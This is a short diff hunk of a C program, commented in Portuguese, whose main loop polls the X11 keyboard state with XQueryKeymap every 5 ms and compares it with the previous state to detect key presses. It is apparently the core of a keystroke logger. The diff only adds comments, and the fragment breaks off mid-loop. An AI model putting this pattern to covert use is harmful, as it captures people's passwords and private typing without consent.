@@ -64,9 +64,15 @@ int main(int argc, char* argv) {
 
   // variavel de controle que eh alterada quando eh chamado alguma handler
   while(!die) {
+
     fflush(stdout);
+
+    // Ao contrario do sleep(segundos) o usleep trabalha com microsegundos.
     usleep(5000);
+
+    // pega o que foi pressionado
     XQueryKeymap(display, nk);
+    
     for(i=0;i<32;i++) {
       if(nk[i] != ok[i]) {
         if(nk[i] != 0) {
